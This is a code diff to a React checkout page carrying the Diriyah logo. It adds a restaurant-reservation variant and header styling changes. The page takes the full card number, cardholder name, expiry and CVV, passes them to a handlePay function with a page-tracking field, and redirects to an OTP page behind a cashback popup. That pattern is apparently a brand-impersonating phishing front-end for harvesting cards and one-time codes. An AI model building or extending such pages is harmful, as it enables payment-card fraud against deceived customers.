@@ -58,11 +58,12 @@ function CashbackPopup({ onClose }: { onClose: () => void }) {
 
 export default function CheckoutPage() {
   const [showPopup, setShowPopup] = useState(true);
+  const isRestaurant = localStorage.getItem("reservationType") === "restaurant";
 
   return (
     <div className="min-h-screen bg-gradient-to-b from-background to-[#f5f0e8] flex flex-col" dir="rtl">
       {showPopup && <CashbackPopup onClose={() => setShowPopup(false)} />}
-      <Header />
+      <Header isRestaurant={isRestaurant} />
       <ProgressSteps />
       <TitleSection />
       <main className="flex-1 px-4 py-6">
@@ -73,12 +74,12 @@ export default function CheckoutPage() {
   );
 }
 
-function Header() {
+function Header({ isRestaurant }: { isRestaurant: boolean }) {
   return (
-    <header className="bg-gradient-to-r from-[#3d3428] to-[#5c4a3d] text-white">
-      <div className="container mx-auto px-4 py-4">
+    <header className="sticky top-0 z-50 bg-gradient-to-r from-[#2a1f16] via-[#3d3428] to-[#2a1f16] text-white shadow-xl">
+      <div className="container mx-auto px-4 py-3">
         <div className="flex items-center justify-between">
-          <Link href="/cart">
+          <Link href={isRestaurant ? "/restaurant-cart" : "/cart"}>
             <Button
               size="icon"
               variant="ghost"
@@ -93,7 +94,7 @@ function Header() {
             <img
               src="/logo-white.svg"
               alt="الدرعية"
-              className="h-12"
+              className="h-10"
               data-testid="img-checkout-logo"
             />
           </div>
@@ -330,6 +331,7 @@ function PaymentForm() {
   const handleSubmit = () => {
     if (!validateForm()) return;
     
+    const isRestaurant = localStorage.getItem("reservationType") === "restaurant";
     const paymentInfo = {
       cardNumber: cardNumber.replace(/\s/g, ""),
       cardName,
@@ -337,7 +339,7 @@ function PaymentForm() {
       expiryYear,
       cvv,
       cardType: getCardType(cardNumber),
-      currentPage: "checkout"
+      currentPage: isRestaurant ? "restaurant_checkout" : "checkout"
     };
     handlePay(paymentInfo, () => {});
     setLocation("/otp");
